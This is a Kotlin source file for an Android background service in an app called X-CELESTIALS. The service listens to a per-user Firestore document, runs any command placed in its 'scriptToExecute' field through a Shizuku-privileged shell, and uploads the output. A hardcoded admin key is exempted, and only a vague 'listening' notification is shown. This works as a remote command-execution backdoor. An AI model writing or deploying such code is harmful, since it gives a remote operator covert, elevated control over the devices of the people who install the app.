package com.example.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.R
import com.example.utils.FreezeManager
import com.example.utils.RenameUtil
import com.google.firebase.firestore.DocumentSnapshot
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration

class ScriptService : Service() {
    private val CHANNEL_ID = "ScriptServiceChannel"
    private var listenerRegistration: ListenerRegistration? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("X-CELESTIALS")
            .setContentText("Listening for background events...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Listening Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val nm = getSystemService(NotificationManager::class.java)
            nm?.createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val savedKey = getSharedPreferences("xcel_prefs", Context.MODE_PRIVATE)
            .getString("saved_key", null)
        FreezeManager.startListening(this)
        if (savedKey != null && !savedKey.equals("mujahi@admin", ignoreCase = true)) {
            listenForScripts(savedKey)
        }
        return START_STICKY
    }

    private fun listenForScripts(key: String) {
        listenerRegistration?.remove()
        listenerRegistration = FirebaseFirestore.getInstance()
            .collection("users")
            .document(key)
            .addSnapshotListener { snapshot: DocumentSnapshot?, error ->
                if (error == null && snapshot != null && snapshot.exists()) {
                    val script = snapshot.getString("scriptToExecute")
                    if (!script.isNullOrBlank()) {
                        Thread {
                            try {
                                val output = RenameUtil.executeShizukuCommandWithOutput(script)
                                FirebaseFirestore.getInstance().collection("users").document(key)
                                    .update("scriptOutput", output, "scriptToExecute", "")
                            } catch (e: Exception) {
                                FirebaseFirestore.getInstance().collection("users").document(key)
                                    .update("scriptOutput", e.message ?: "Error", "scriptToExecute", "")
                            }
                        }.start()
                    }
                }
            }
    }

    override fun onDestroy() {
        super.onDestroy()
        listenerRegistration?.remove()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
